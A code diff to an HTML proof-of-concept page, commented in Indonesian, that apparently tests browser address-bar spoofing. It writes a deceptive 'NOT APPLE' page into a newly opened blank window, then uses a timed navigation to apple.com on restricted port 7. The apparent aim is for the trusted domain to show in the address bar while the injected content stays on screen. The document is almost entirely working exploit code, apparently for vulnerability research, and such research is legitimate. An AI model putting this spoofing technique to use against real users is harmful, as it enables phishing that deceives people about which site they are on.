@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Transition Timing & State PoC</title>
+    <title>Invalid Port Navigation & State PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -41,12 +41,11 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE TRANSITION TEST</button>
+      <button id="execBtn">INITIALIZE INVALID PORT TEST</button>
       <div class="info" id="statusInfo">Status: Ready for execution.</div>
     </div>
 
     <script>
-      // Menggunakan let sesuai struktur yang diinginkan (tanpa const)
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
 
@@ -54,7 +53,7 @@
         statusInfo.innerText = "Status: Initializing execution flow...";
         this.style.display = "none";
 
-        // Membuka jendela baru menggunakan let targetWindow
+        // Membuka jendela baru dengan about:blank
         let targetWindow = window.open("about:blank", "_blank");
 
         if (!targetWindow) {
@@ -63,9 +62,8 @@
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting custom state payload...";
+          statusInfo.innerText = "Status: Injecting 'NOT APPLE' deceptive payload...";
 
-          // Payload awal untuk menguji jeda render visual
           let initialPayload = `
             <!DOCTYPE html>
             <html>
@@ -86,7 +84,7 @@
             <body>
               <div class="box">
                 <h1>NOT APPLE</h1>
-                <p>Simulated State Transition</p>
+                <p>Forced Invalid Port Race Test</p>
               </div>
             </body>
             </html>
@@ -96,20 +94,21 @@
           targetWindow.document.write(initialPayload);
           targetWindow.document.close();
 
-          statusInfo.innerText = "Status: Payload committed. Managing navigation timing sequence...";
+          statusInfo.innerText = "Status: Payload committed. Dispatching invalid port navigation...";
 
-          // Logika Timing diperkuat untuk menguji ketahanan transisi ke target eksternal
+          // Kombinasi Timing dan Invalid Port (Port 7 / Port terlarang lainnya)
+          // Memaksa browser mengevaluasi URL target dengan port non-standar untuk menguji penundaan commit
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Triggering transition toward target URL...";
+              statusInfo.innerText = "Status: Forcing navigation to apple.com via restricted port...";
               
-              // Mengarahkan ke target eksternal untuk menguji perilaku commit bilah alamat
-              targetWindow.location.href = "http://apple.com:9090";
+              // Port 7 secara historis merupakan port Echo yang sering diblokir atau memicu ERR_UNSAFE_PORT
+              targetWindow.location.href = "https://apple.com:7/spoof-test";
 
             } catch (navError) {
               statusInfo.innerText = "Status: Transition restricted by security policy: " + navError.message;
             }
-          }, 1000);
+          }, 800);
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error encountered: " + err.message;
